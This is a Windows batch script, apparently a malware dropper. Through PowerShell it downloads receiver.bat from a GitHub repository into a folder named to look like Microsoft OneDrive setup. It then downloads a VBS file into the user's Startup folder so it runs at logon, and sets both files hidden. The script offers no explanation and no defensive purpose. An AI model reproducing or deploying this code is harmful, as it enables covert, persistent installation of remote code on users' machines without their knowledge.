@echo off
setlocal enabledelayedexpansion

REM Download the batch file
powershell -NoProfile -Command ^
    "try {" ^
    "    Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/pico/raw/main/receiver.bat' -OutFile 'C:\ProgramData\Microsoft OneDrive\setup\receiver.bat';" ^
    "    Write-Host 'Download completed.'" ^
    "} catch {" ^
    "    Write-Host 'Failed to download file: $_'" ^
    "}"

REM Hide the batch file if it exists
powershell -NoProfile -Command ^
    "try {" ^
    "    if (Test-Path 'C:\ProgramData\Microsoft OneDrive\setup\receiver.bat') {" ^
    "        Set-ItemProperty -Path 'C:\ProgramData\Microsoft OneDrive\setup\receiver.bat' -Name Attributes -Value ([System.IO.FileAttributes]::Hidden);" ^
    "        Write-Host 'File hidden.'" ^
    "    } else {" ^
    "        Write-Host 'File not found.'" ^
    "    }" ^
    "} catch {" ^
    "    Write-Host 'Failed to hide the file: $_'" ^
    "}"

REM Download the VBS file
powershell -NoProfile -Command ^
    "try {" ^
    "    $startupPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup\file.vbs');" ^
    "    Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/pico/raw/main/file.vbs' -OutFile $startupPath;" ^
    "} catch {" ^
    "    Write-Host 'Failed to download starter'" ^
    "}"

REM Hide the VBS file if it exists
powershell -NoProfile -Command ^
    "try {" ^
    "    if (Test-Path $startupPath) {" ^
    "        Set-ItemProperty -Path $startupPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden);" ^
    "        Write-Host 'File hidden.'" ^
    "    } else {" ^
    "        Write-Host 'File not found.'" ^
    "    }" ^
    "} catch {" ^
    "    Write-Host 'Failed to hide the file: $_'" ^
    "}"
